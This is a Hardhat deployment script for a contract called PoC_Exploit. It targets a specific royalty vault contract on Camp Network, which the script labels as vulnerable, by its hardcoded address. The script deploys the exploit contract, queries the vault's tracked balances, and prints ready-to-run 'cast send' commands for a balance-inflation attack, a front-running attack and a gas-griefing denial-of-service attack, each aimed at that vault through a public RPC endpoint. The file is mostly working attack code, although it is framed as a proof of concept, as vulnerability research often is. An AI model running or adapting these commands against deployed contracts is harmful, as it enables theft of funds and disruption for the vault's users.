const { ethers } = require("hardhat");

/**
 * ════════════════════════════════════════════════════════
 *  DEPLOY PoC_Exploit to Camp Network (or localhost)
 * ════════════════════════════════════════════════════════
 *
 * Usage:
 *   npx hardhat run scripts/deploy.js --network campNetwork
 *   npx hardhat run scripts/deploy.js --network localhost
 */

async function main() {
  const [deployer] = await ethers.getSigners();
  console.log("Deploying with account:", deployer.address);
  console.log("Balance:", ethers.formatEther(await ethers.provider.getBalance(deployer.address)), "ETH\n");

  // ── Deploy PoC_Exploit ──────────────────────────
  const Exploit = await ethers.getContractFactory("PoC_Exploit");
  const exploit = await Exploit.deploy();
  await exploit.waitForDeployment();

  console.log("✅ PoC_Exploit deployed to:", exploit.target);
  console.log(`   Block explorer: https://basecamp.cloud.blockscout.com/address/${exploit.target}\n`);

  // ── Example: Get the vulnerable vault interface ──
  const VAULT_ADDRESS = "0xb27092564b5434f68706753f9C0ADDC49Ca71dC5";
  const vault = await ethers.getContractAt("IIpRoyaltyVault", VAULT_ADDRESS);

  // Check current vault state
  const trackedBalance = await vault.vaultAccBalance(
    "0x0000000000000000000000000000000000000000"
  );
  const tokenCount = await vault.getRevenueTokens();

  console.log("📊 Vulnerable Vault State:");
  console.log(`   Tracked ETH balance: ${ethers.formatEther(trackedBalance)} ETH`);
  console.log(`   Revenue tokens tracked: ${tokenCount.length}\n`);

  // ── Instructions for exploitation ─────────────────
  console.log("╔══════════════════════════════════════════════╗");
  console.log("║         EXPLOIT COMMANDS                     ║");
  console.log("╚══════════════════════════════════════════════╝");
  console.log();
  console.log("1️⃣  Balance Inflation Attack:");
  console.log(`   cast send ${exploit.target} "exploit_BalanceInflation(address,uint256)" \\`);
  console.log(`     ${VAULT_ADDRESS} 10000000000000000000000 \\`);
  console.log(`     --rpc-url https://rpc.basecamp.t.raas.gelato.cloud`);
  console.log(`     --private-key $PRIVATE_KEY`);
  console.log();
  console.log("2️⃣  Front-Running Attack:");
  console.log(`   cast send ${exploit.target} "exploit_FrontRunDeposit(address,address,uint256)" \\`);
  console.log(`     ${VAULT_ADDRESS} 0x0000000000000000000000000000000000000000 100000000000000000000 \\`);
  console.log(`     --rpc-url https://rpc.basecamp.t.raas.gelato.cloud`);
  console.log(`     --private-key $PRIVATE_KEY`);
  console.log();
  console.log("3️⃣  Gas Griefing DoS Attack:");
  console.log(`   cast send ${exploit.target} "exploit_GasGriefing_AddFakeTokens(address,uint256)" \\`);
  console.log(`     ${VAULT_ADDRESS} 200 \\`);
  console.log(`     --rpc-url https://rpc.basecamp.t.raas.gelato.cloud`);
  console.log(`     --private-key $PRIVATE_KEY`);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
